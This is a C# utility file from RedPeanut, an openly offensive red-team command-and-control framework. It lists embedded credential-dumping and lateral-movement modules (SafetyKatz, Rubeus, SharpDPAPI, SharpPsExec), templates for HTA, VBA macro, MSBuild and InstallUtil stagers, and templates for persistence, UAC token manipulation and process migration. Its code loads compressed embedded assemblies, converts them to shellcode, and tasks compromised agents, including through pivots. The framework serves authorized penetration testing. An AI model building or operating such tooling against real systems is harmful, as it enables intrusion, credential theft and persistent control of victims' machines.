//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using static RedPeanut.Models;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using System.Text.RegularExpressions;

namespace RedPeanut
{
    public class Utility
    {
        public const string PL_BINARY_HTTPS = "RedPeanut.Resources.binary-https.txt";
        public const string PL_BINARY_SMB_NAMED_PIPE = "RedPeanut.Resources.binary-smb-named-pipe.txt";
        public const string PL_BINARY_DNS = "RedPeanut.Resources.binary-dns.txt";

        public const string PL_BINARY_DELEGATE_PRE_35 = "RedPeanut.Resources.delegate-pre-35.txt";
        public const string PL_BINARY_DELEGATE_POST_35 = "RedPeanut.Resources.delegate-post-35.txt";
        public const string PL_BINARY_DELEGATE_PRE = "RedPeanut.Resources.delegate-pre.txt";
        public const string PL_BINARY_DELEGATE_POST = "RedPeanut.Resources.delegate-post.txt";

        public const string PL_MODULE_SEATBELT = "RedPeanut.Resources.seatbelt.txt";
        public const string PL_MODULE_SHARPWMI = "RedPeanut.Resources.sharpwmi.txt";
        public const string PL_MODULE_SHARPCOM = "RedPeanut.Resources.sharpcom.txt";
        public const string PL_MODULE_SHARPUP = "RedPeanut.Resources.sharpup.txt";
        public const string PL_MODULE_SHARPDPAPI = "RedPeanut.Resources.sharpdpapi.txt";
        public const string PL_MODULE_RUBEUS = "RedPeanut.Resources.rubeus.txt";
        public const string PL_MODULE_SHARPWEB = "RedPeanut.Resources.sharpweb.txt";
        public const string PL_MODULE_SAFETYKATZ = "RedPeanut.Resources.safetykatz.txt";
        public const string PL_MODULE_SHARPGPOABUSE = "RedPeanut.Resources.sharpgpoabuse.txt";
        public const string PL_MODULE_SHARPPSEXEC = "RedPeanut.Resources.sharppsexec.txt";
        public const string PL_MODULE_SHARPADIDNSDUMP = "RedPeanut.Resources.sharpadidnsdump.txt";
        public const string PL_MODULE_SHARPMINIDUMP = "RedPeanut.Resources.sharpminidump.txt";
        public const string PL_MODULE_SHARPKATZ = "RedPeanut.Resources.sharpkatz.txt";
        
        //public const string PL_COMMAND_NUTCLR = "RedPeanut.Resources.nutclr.txt";
        //public const string PL_COMMAND_NUTCLRWNF = "RedPeanut.Resources.nutclrwnf.txt";

        public const string SERVERKEY_FILE = "serverkey.json";
        public const string EXECUTE_ASSEMBLY_TEMPLATE = "AssemblyLoader.cs";
        public const string STAGER_TEMPLATE = "RedPeanutRP.cs";
        public const string SHOOTER_TEMPLATE = "RedPeanutShooter.cs";
        public const string SPAWNER_TEMPLATE = "SharpSpawner.cs";
        public const string POWERSHELLEXECUTER_TEMPLATE = "PowerShellExecuter.cs";
        public const string STANDARD_TEMPLATE = "StandardCommandImpl.cs";
        public const string FILEUPLOAD_TEMPLATE = "FileUpLoader.cs";
        public const string FILEDOWNLOAD_TEMPLATE = "FileDownLoader.cs";
        public const string AGENT_TEMPLATE = "RedPeanutAgent.cs";
        public const string HTML_TEMPLATE = "RedPeanut.html";
        public const string SERVICE_TEMPLATE = "SharpPsExecService.cs";
        public const string SHARPSEXEC_TEMPLATE = "SharpPsExec.cs";
        public const string POWERHSELL_S0_TEMPLATE = "RedPeanutPowershellScriptS0.ps1";
        public const string POWERHSELL_S1_TEMPLATE = "RedPeanutPowershellScriptS1.ps1";
        public const string POWERHSELL_S2_TEMPLATE = "RedPeanutPowershellScriptS2.ps1";
        public const string MSBUILD_TEMPLATE = "RedPeanutMSBuildScript.xml";
        public const string INSTALLUTIL_TEMPLATE = "RedPeanutInstallUtil.cs";
        public const string HTA_TEMPLATE = "RedPeanutHtaScript.hta";
        public const string HTA_POWERSHELL_TEMPLATE = "RedPeanutHtaPowerShellScript.hta";
        public const string VBA_TEMPLATE = "RedPeanutVBAMacro.vba";
        public const string PERSAUTORUN_TEMPLATE = "PersAutorun.cs";
        public const string PERSWMI_TEMPLATE = "PersWMI.cs";
        public const string PERSSTARTUP_TEMPLATE = "PersStartup.cs";
        public const string UACTOKEN_TEMPLATE = "TokenManipulation.cs";
        public const string CLRHOOKINSTALL_TEMPLATE = "PersCLRInstall.cs";
        public const string MIGRATE_TEMPLATE = "RedPeanutMigrate.cs";
        public const string SPAWN_TEMPLATE = "RedPeanutSpawn.cs";
        public const string WORKSPACE_FOLDER = "Workspace";
        public const string PAYLOADS_FOLDER = "Payloads";
        public const string PROFILES_FOLDER = "Profiles";
        public const string DOTNET_40_REF_FOLDER = "Net40";
        public const string DOTNET_35_REF_FOLDER = "Net35";
        public const string ASSEMBLY_OIUTPUT_FOLDER = "Assembly";
        public const string TEMPLATE_FOLDER = "Templates";
        public const string DOWNLOADS_FOLDER = "Downloads";
        public const string EVILCLIPPY_FOLDER = "EvilClippy";
        public const string IMAGELOAD_FOLDER = "ImageLoad";
        public const string SRC_FOLDER = "RedPeanutAgent";
        public const string EXTERNAL_FOLDER = "External";
        public const string SHELLCODE_FOLDER = "Shellcode";
        public const string KEYFILE_FOLDER = "KeyFile";

        public enum CompilationProfile
        {
            Generic,
            Agent,
            UACBypass,
            StandardCommand,
            PersistenceCLR,
            Migrate,
            SSploitCredentials,
            SSploitEnumeration,
            SSploitEvasion,
            SSploitExecution,
            SSploitExecution_DynamicInvoke,
            SSploitExecution_Injection,
            SSploitExecution_ManualMap,
            SSploitExecution_PlatformInvoke,
            SSploitGeneric,
            SSploitLateralMovement,
            SSploitMisc,
            SSploitPivoting,
            SSploitPersistence,
            SSploitPrivilegeEscalation
        }

        public static void ShutDown()
        {
            foreach (ListenerConfig conf in Program.GetC2Manager().GetC2Server().GetListenersConfig().Values)
            {
                conf.CancellationTokenSource.Cancel();
            }

            Environment.Exit(0);
        }

        public static string RedPeanutCLI(IAgentInstance agent, string module)
        {
            string input;
            if (agent == null)
            {
                PrintCLI(module);
                input = ReadLine.Read();

                if (input.Trim().Length > 0)
                {
                    ReadLine.AddHistory(input);
                }

                return input;
            }
            else
            {
                PrintCLI(agent.AgentId, module);
                input = ReadLine.Read();
                StandardCommand cmd = new StandardCommand(agent);
                if (cmd.Execute(input))
                    input = "";

                if (input.Trim().Length > 0)
                {
                    ReadLine.AddHistory(input);
                }

                return input;
            }
        }

        public static string RedPeanutCLI(IAgentInstance agent)
        {
            PrintCLI(agent);
            string input = ReadLine.Read();
            StandardCommand cmd = new StandardCommand(agent);
            if (cmd.Execute(input))
                input = "";

            if (input.Trim().Length > 0)
            {
                ReadLine.AddHistory(input);
            }

            return input;
        }

        public static string RedPeanutCLI()
        {
            PrintCLI();
            string input = ReadLine.Read();

            if (input.Trim().Length > 0)
            {
                ReadLine.AddHistory(input);
            }

            return input.TrimEnd(' ');
        }

        public static void PrintCLI(string agentid, string module)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("RP");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" {0} ", agentid);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("-");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(" {0} ", module);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("> ");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        public static void PrintCLI(string label)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("RP");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(" {0} ", label);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("> ");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        public static void PrintCLI(IAgentInstance agent)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("RP");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("]");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" {0} ", agent.AgentId);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("> ");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        public static void PrintCLI()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("RP");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("] > ");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        static public void RePrintCLI(IAgentInstance agent,string modulename)
        {
            if(agent == null && string.IsNullOrEmpty(modulename))
            {
                PrintCLI();
            }
            else
            {
                if (agent == null && !string.IsNullOrEmpty(modulename))
                {
                    PrintCLI(modulename);
                }
                else
                {
                    if (agent != null && !string.IsNullOrEmpty(modulename))
                    {
                        PrintCLI(agent.AgentId,modulename);
                    }
                    else
                    {
                        PrintCLI(agent);
                    }
                }
            }
        }

        public static string ParseSelection(string input)
        {
            string[] a_input = Regex.Split(input, @"\s+");
            string f_input = "";

            if (a_input.Length > 0)
            {
                for (int i = 0; i < 2 && i < a_input.Length; i++)
                    f_input += a_input[i] + " ";
            }
            else
            {
                f_input = input;
            }
            return f_input;
        }

        //https://stackoverflow.com/questions/42786986/how-to-create-a-valid-self-signed-x509certificate2-programmatically-not-loadin
        public static X509Certificate2 BuildSelfSignedServerCertificate(string canonicalname, string ipaddress, string pkf, string cert, string[] dnsname = null)
        {
            Console.WriteLine("[*] ipaddress {0}", ipaddress);
            string CertificateName = String.Format("CN={0}", canonicalname);
            SubjectAlternativeNameBuilder sanBuilder = new SubjectAlternativeNameBuilder();
            if(!string.IsNullOrEmpty(ipaddress))
                sanBuilder.AddIpAddress(IPAddress.Parse(ipaddress));

            if (dnsname != null)
            {
                foreach(string s in dnsname)
                    sanBuilder.AddDnsName(s);
            }

            X500DistinguishedName distinguishedName = new X500DistinguishedName(CertificateName);

            using (RSA rsa = RSA.Create(2048))
            {
                var request = new CertificateRequest(distinguishedName, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

                request.CertificateExtensions.Add(
                    new X509KeyUsageExtension(X509KeyUsageFlags.DataEncipherment | X509KeyUsageFlags.KeyEncipherment | X509KeyUsageFlags.DigitalSignature, false));

                request.CertificateExtensions.Add(
                   new X509EnhancedKeyUsageExtension(
                       new OidCollection { new Oid("1.3.6.1.5.5.7.3.1") }, false));

                request.CertificateExtensions.Add(sanBuilder.Build());

                var certificate = request.CreateSelfSigned(new DateTimeOffset(DateTime.UtcNow.AddDays(-1)), new DateTimeOffset(DateTime.UtcNow.AddDays(3650)));

                //System.PlatformNotSupportedException: The FriendlyName value cannot be set on Unix.
                //certificate.FriendlyName = CertificateName;

                File.WriteAllBytes(pkf, certificate.Export(X509ContentType.Pfx));
                File.WriteAllBytes(cert, certificate.Export(X509ContentType.Cert));

                return new X509Certificate2(certificate.Export(X509ContentType.Pfx));
            }
        }

        public static byte[] CompressAssembly(byte[] bytes)
        {
            MemoryStream mems = new MemoryStream();
            DeflateStream zips = new DeflateStream(mems, CompressionMode.Compress);
            zips.Write(bytes, 0, bytes.Length);
            zips.Close();
            mems.Close();

            return mems.ToArray();
        }

        public static byte[] CompressGZipAssembly(byte[] bytes)
        {
            MemoryStream mems = new MemoryStream();
            GZipStream zips = new GZipStream(mems, CompressionMode.Compress);
            zips.Write(bytes, 0, bytes.Length);
            zips.Close();
            mems.Close();

            return mems.ToArray();
        }
        
        public static byte[] GetPayload(string resname)
        {
            Console.WriteLine("Debug passend Name: " + resname);
            string[] names = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
            foreach (string result in names)
            {
                Console.WriteLine("Debug Name: " + result);
            }

            if(string.IsNullOrEmpty(ReadResourceFile(resname)))
            {
                return null;
            }
            else
            {
                return DecompressDLL(Convert.FromBase64String(ReadResourceFile(resname)));
            }
        }

        private static System.Reflection.Assembly GetAssemblyObject(string resource)
        {
            byte[] res = GetPayload(resource);
            if (res != null)
            {
                return System.Reflection.Assembly.Load(res);
            }
            else
            {
                return null;
            }
        }

        public static void RunStandardBase64(string assembly, string method,string type, string[] args, IAgentInstance agent)
        {
            if (agent != null)
            {
                StandardConfig modconfig = new StandardConfig
                {
                    Assembly = assembly,
                    Method = method,
                    Moduleclass = type,
                    Parameters = args.ToArray<string>()
                };

                TaskMsg task = new TaskMsg
                {
                    TaskType = "standard",
                    Instanceid = RandomAString(10,new Random()),
                    StandardTask = modconfig,
                    Agentid = agent.AgentId
                };

                if (agent.Pivoter != null)
                    task.AgentPivot = agent.Pivoter.AgentId;
                agent.SendCommand(task);
            }

        }

        public static void RunAssemblyBase64(string assembly, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null, string instanceid = null)
        {
            RunAssemblyBase64(assembly, "Execute", type, args, agent, tasktype, destfilename,instanceid);

        }

        public static void RunAssemblyBase64(string assembly, string method, string type, string[] args, IAgentInstance agent, string tasktype = null, string destfilename = null, string instanceid = null)
        {
            switch(tasktype)
            {
                case "download":
                    FileDownloadConfig downloadconfig = new FileDownloadConfig
                    {
                        Assembly = assembly,
                        Method = method,
                        Moduleclass = type,
                        Parameters = args.ToArray<string>(),
                        FileNameDest = destfilename
                    };

                    TaskMsg downloadtask = new TaskMsg
                    {
                        TaskType = "download",
                        DownloadTask = downloadconfig,
                        Agentid = agent.AgentId
                    };

                    if (instanceid == null)
                        downloadtask.Instanceid = RandomAString(10, new Random());
                    else
                        downloadtask.Instanceid = instanceid;

                    if (agent.Pivoter != null)
                        downloadtask.AgentPivot = agent.Pivoter.AgentId;

                    agent.SendCommand(downloadtask);
                    break;
                case "migrate":
                    ModuleConfig migrateconfig = new ModuleConfig
                    {
                        Assembly = assembly,
                        Method = method,
                        Moduleclass = type,
                        Parameters = args.ToArray<string>()
                    };

                    TaskMsg migratetask = new TaskMsg
                    {
                        TaskType = "migrate",
                        ModuleTask = migrateconfig,
                        Agentid = agent.AgentId
                    };

                    if (instanceid == null)
                        migratetask.Instanceid = RandomAString(10, new Random());
                    else
                        migratetask.Instanceid = instanceid;

                    if (agent.Pivoter != null)
                        migratetask.AgentPivot = agent.Pivoter.AgentId;

                    agent.SendCommand(migratetask);
                    break;
                default:
                    ModuleConfig modconfig = new ModuleConfig
                    {
                        Assembly = assembly,
                        Method = method,
                        Moduleclass = type,
                        Parameters = args.ToArray<string>()
                    };

                    if (agent.Managed)
                        modconfig.Assembly = assembly;
                    else
                        modconfig.Assembly = Convert.ToBase64String(CompressGZipAssembly(Builder.GenerateShellcode(
                             assembly, RandomAString(10, new Random()) + ".exe", type, method, args)));

                    TaskMsg task = new TaskMsg
                    {
                        TaskType = "module",
                        ModuleTask = modconfig,
                        Agentid = agent.AgentId
                    };

                    if (instanceid == null)
                        task.Instanceid = RandomAString(10, new Random());
                    else
                        task.Instanceid = instanceid;

                    if (agent.Pivoter != null)
                        task.AgentPivot = agent.Pivoter.AgentId;

                    agent.SendCommand(task);
                    break;
            }
            
        }

        public static void RunAssembly(string resname, string type, string[] args, IAgentInstance agent)
        {
            if(agent != null)
            {
                ModuleConfig modconfig = new ModuleConfig
                {
                    Assembly = ReadResourceFile(resname),
                    Method = "Execute",
                    Moduleclass = type,
                    Parameters = args
                };

                if (agent.Managed)
                    modconfig.Assembly = ReadResourceFile(resname);
                else
                    modconfig.Assembly = Convert.ToBase64String(CompressGZipAssembly(Builder.GenerateShellcode(
                         ReadResourceFile(resname), RandomAString(10, new Random()) + ".exe", type, "Execute", args)));

                TaskMsg task = new TaskMsg
                {
                    TaskType = "module",
                    Instanceid = RandomAString(10, new Random()),
                    ModuleTask = modconfig,
                    Agentid = agent.AgentId
                };

                if (agent.Pivoter != null)
                    task.AgentPivot = agent.Pivoter.AgentId;
                agent.SendCommand(task);
            }
            
        }

        public static string ReadResourceFile(string filename)
        {
            try
            {
                var thisAssembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = thisAssembly.GetManifestResourceStream(filename))
                {
                    using (var reader = new StreamReader(stream))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Errore reading resource file {0} {1}", e.Message, filename);
                return "";
            }
        }

        public static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        private static void PrintStandards()
        {
            Console.WriteLine("[*]");
            Console.WriteLine("[*]   Commands");
            Console.WriteLine("[*]");
            //Display help
            for (int i = 0; i < StandardCommand.mainmenu.Count; i++)
            {
                //Display help
                Console.WriteLine("[*]   {0}: {1}", StandardCommand.mainmenu.ElementAt(i).Key, StandardCommand.mainmenu.ElementAt(i).Value);
            }
            Console.WriteLine("[*]");
        }

        private static void PrintModoleOptions(String reason, Dictionary<string, string> menu)
        {
            Console.WriteLine("[*]");
            Console.WriteLine("[*]   {0}", reason);
            Console.WriteLine("[*]");
            //Display help
            for (int i = 0; i < menu.Count; i++)
            {
                //Display help
                Console.WriteLine("[*]   {0}: {1}", menu.ElementAt(i).Key, menu.ElementAt(i).Value);
            }
            Console.WriteLine("[*]");
        }

        public static void PrintOptions(String reason, Dictionary<string,string> menu)
        {
            PrintStandards();
            PrintModoleOptions(reason, menu);
        }

        public static void PrintOptionsNoStd(String reason, Dictionary<string, string> menu)
        {
            PrintModoleOptions(reason, menu);
        }

        public static void PrintCurrentConfig(string modulename, Dictionary<string, string> options)
        {
            Console.WriteLine("[*]");
            Console.WriteLine("[*]   {0}", modulename);
            Console.WriteLine("[*]");
            //Display help
            for (int i = 0; i < options.Count; i++)
            {
                //Display help
                Console.WriteLine("[*]   {0}: {1}", options.ElementAt(i).Key, options.ElementAt(i).Value);
            }
            Console.WriteLine("[*]");
        }

        public static string GetParsedSetString(string input)
        {
            string[] a_input = input.Split(' ');
            if (a_input.Length == 3)
            {
                return a_input[2];
            }
            else
            {
                Console.WriteLine("We had a woodoo");
                return "";
            }
        }

        public static string GetParsedSetFilePath(string input)
        {
            string[] a_input = input.Split(' ');
            if (a_input.Length == 3)
            {
                if(File.Exists(a_input[2]))
                {
                    return a_input[2];
                }
                else
                {
                    Console.WriteLine("[x] File does not exists");
                    return "";
                }
            }
            else
            {
                Console.WriteLine("We had a woodoo");
                return "";
            }
        }

        public static string GetParsedSetStringMulti(string input)
        {
            string[] a_input = input.Split(' ');
            if (a_input.Length >= 3)
            {
                string f_input = "";
                for (int i = 2;i < a_input.Length; i++)
                    f_input += a_input[i] + " ";

                return f_input;
            }
            else
            {
                if (a_input.Length == 1)
                {
                    string f_input = a_input[0];

                    return f_input;
                }
                else
                {
                    Console.WriteLine("We had a woodoo");
                    return "";
                }
            }
        }

        public static int GetParsedSetInt(string input)
        {
            string[] a_input = input.Split(' ');
            if (a_input.Length == 3)
            {
                try
                {
                    return Convert.ToInt32(a_input[2]);
                }
                catch (Exception)
                {
                    return 0;
                }
            }
            else
            {
                Console.WriteLine("We had a woodoo");
                return 0;
            }
        }

        public static bool GetParsedSetBool(string input)
        {
            string[] a_input = input.Split(' ');
            if (a_input.Length == 3)
            {
                try
                {
                    return Convert.ToBoolean(a_input[2]);
                }
                catch (Exception)
                {
                    return false;
                }
            }
            else
            {
                Console.WriteLine("We had a woodoo");
                return false;
            }
        }

        //Agentid generator
        public static string RandomString(int length, Random random)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string RandomAString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static void SetAutoCompletionHandler(Dictionary<string,string> menu)
        {
            AutoCompletionHandler autoc = new AutoCompletionHandler();
            autoc.menu = menu;
            ReadLine.AutoCompletionHandler = autoc;
        }

        public static IEnumerable<string> Split(string str, double chunkSize)
        {
            return Enumerable.Range(0, (int)Math.Ceiling(str.Length / chunkSize))
               .Select(i => new string(str
                   .Skip(i * (int)chunkSize)
                   .Take((int)chunkSize)
                   .ToArray()));
        }
    }
}
